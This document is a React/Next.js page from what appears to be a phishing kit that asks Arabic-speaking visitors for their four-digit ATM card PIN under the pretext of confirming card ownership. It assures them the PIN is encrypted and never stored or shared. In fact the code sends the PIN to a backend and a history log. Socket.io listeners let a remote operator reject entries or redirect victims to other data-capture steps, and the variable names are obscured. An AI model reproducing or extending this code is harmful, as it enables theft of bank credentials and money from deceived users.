"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { addData } from "@/lib/api"
import { onVisitorStatusUpdated } from "@/lib/socket"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

export default function ConfiPage() {
  const router = useRouter()
  const [_v6, _s6] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "confi", 6)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "confi" })

  // Navigation listener - listen for admin redirects via Socket.io
  useEffect(() => {
    if (!visitorId) return
    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === 'currentStep') {
        if (status === 'home') router.push('/insur')
        else if (status === 'phone') router.push('/step5')
        else if (status === '_t6') router.push('/step4')
        else if (status === '_st1') router.push('/check')
        else if (status === '_t2') router.push('/step2')
      }
    })
    return () => unsubscribe()
  }, [router, visitorId])

  // Check access and monitor PIN status via Socket.io
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }
    setIsLoading(false)

    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === '_v6Status' && status === 'rejected') {
        addData({ id: visitorID, _v6Status: 'pending' }).catch(console.error)
        _ss6('pending')
        _s6('')
        setError('تم رفض الرقم السري. يرجى إدخال رقم صحيح.')
        setIsSubmitting(false)
      }
    })

    return () => unsubscribe()
  }, [router])

  // Removed auto-submit - user must click button to submit

  const handlePinSubmit = async () => {
    if (_v6.length !== 4) {
      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)

    try {
      await addData({
        id: visitorID,
        _v6,
        pinSubmittedAt: new Date().toISOString(),
        _v6Status: 'approved',
        currentStep: 'phone',
        paymentStatus: 'pin_completed',
        pinUpdatedAt: new Date().toISOString()
      })

      // Add PIN to history (always approved)
      await addToHistory(visitorID, "_t3", {
        _v6
      }, "approved")

      // Wait 2 seconds then redirect to phone page
      setTimeout(() => {
        router.push("/step5")
      }, 2000)
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
      setIsSubmitting(false)
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
      {/* Full Screen Spinner when submitting */}
      {(isSubmitting || _v6Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <div className="w-full max-w-md">
        {/* Icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
            <Lock className="w-12 h-12 text-[#0a4a68]" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-6">
            {error && (
              <Alert variant="destructive" className="border-2">
                <AlertCircle className="h-5 w-5" />
                <AlertDescription className="text-base">{error}</AlertDescription>
              </Alert>
            )}

            <div className="space-y-4">
              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
                الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة
              </p>

              {/* Additional Info */}
              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2">
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <ShieldCheck className="w-4 h-4" />
                  <span>للتأكد من هويتك وحماية حسابك</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Lock className="w-4 h-4" />
                  <span>الرقم السري محمي ومشفر بالكامل</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Eye className="w-4 h-4" />
                  <span>لن يتم حفظ أو مشاركة الرقم السري</span>
                </div>
              </div>
              
              <Input
                type="password"
                inputMode="numeric"
                placeholder="رقم الصراف (PIN)"
                value={_v6}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 4)
                  _s6(value)
                  setError("")
                }}
                maxLength={4}
                className="h-14 text-center text-lg px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
                disabled={isSubmitting || _v6Status === "verifying"}
                required
                autoFocus
              />
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
              disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
            >
              تأكيد الدفع
            </Button>
          </form>
        </div>
      </div>
    </div>
  )
}
